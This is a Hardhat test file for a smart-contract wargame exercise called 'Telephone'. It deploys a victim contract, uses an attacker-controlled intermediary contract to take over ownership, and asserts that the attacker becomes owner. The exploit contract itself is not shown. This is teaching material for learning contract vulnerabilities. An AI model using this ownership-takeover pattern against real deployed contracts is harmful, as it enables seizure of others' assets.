const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exercise 4 - Telephone", function () {

    let deployer, attacker;

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const Telephone = await ethers.getContractFactory("Telephone");
        this.contract = await Telephone.deploy();
        await this.contract.deployed();
    });


    it("Claim ownership of the contract", async function () {
        // Initially, deployer should be the owner
        expect(await this.contract.owner()).to.eq(deployer.address)

        // Deploy attacking contract
        const ContractCaller = await ethers.getContractFactory("ContractCaller", attacker);
        const attackingContract = await ContractCaller.deploy(this.contract.address);
        await attackingContract.deployed();

        // Call the contract with the attacking contract to claim ownership
        const tx = await attackingContract.callVictimContract();
        // wait until the transaction is mined
        await tx.wait();

        expect(await this.contract.owner()).to.eq(attacker.address)
    });

});
